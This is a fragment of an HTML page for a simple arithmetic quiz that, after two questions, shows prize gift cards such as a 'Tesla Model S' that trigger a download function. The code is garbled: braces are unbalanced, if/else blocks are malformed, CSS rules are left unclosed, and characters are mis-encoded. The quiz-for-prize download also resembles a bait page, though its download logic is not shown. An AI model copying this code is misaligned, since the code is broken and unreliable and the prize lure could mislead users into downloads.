        h1 { color: #2c3e50; font-size: 2.5em; }

        input[type="number"] {

        .gift-card {

</head>
<body>

<div class="container" id="main-container">

</div>

<script>
let level = 0;
const questions = [

    { q: "45 √∑ 5 =", a: 9 },
    { q: "12 + 18 =", a: 30 },

];

function showQuestion() {
    document.getElementById("question").innerText = questions[level].q;
    document.getElementById("answer").value = "";
    document.getElementById("answer").focus();
}

function checkAnswer() {
    let user = Number(document.getElementById("answer").value);
    if (user === questions[level].a) {

        } else {
            showPrizeSelection();

    } else {

}

function showPrizeSelection() {

        <div class="gift-card" onclick="startDownload('une Tesla Model S')">üöó Tesla Model S</div>
